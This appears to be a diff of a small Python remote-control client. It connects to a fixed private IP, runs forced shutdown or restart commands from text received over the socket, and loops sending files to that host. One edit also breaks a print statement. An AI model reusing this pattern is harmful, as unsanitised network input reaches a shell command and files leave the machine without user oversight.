@@ -1,13 +1,12 @@
 import socket
 import win32api
 import os
-import autopy
-from Crypto.Cipher import AES
 import sys
+import autopy
 import subprocess
 
 
-hostAddr = '192.168.1.4'
+hostAddr = '10.5.30.15'
 port = 5000
 
 s = socket.socket()
@@ -43,7 +42,7 @@ def browse_file():
 def shutdown_restart():
 	shutdown = s.recv(1024)
 	shutdowntype = "-" + str(shutdown)
-	print shutdowntype 
+	print ("shutdowntype") 
 	command = "shutdown {0} -f -t 30".format(shutdowntype)
 
 	#-f for forced hutdown close all apps
@@ -101,7 +100,7 @@ def transfer_file():
 				s.send(Bytes)
 
 while True:
-	shutdown_restart()
+	transfer_file()
 
 s.close()
 
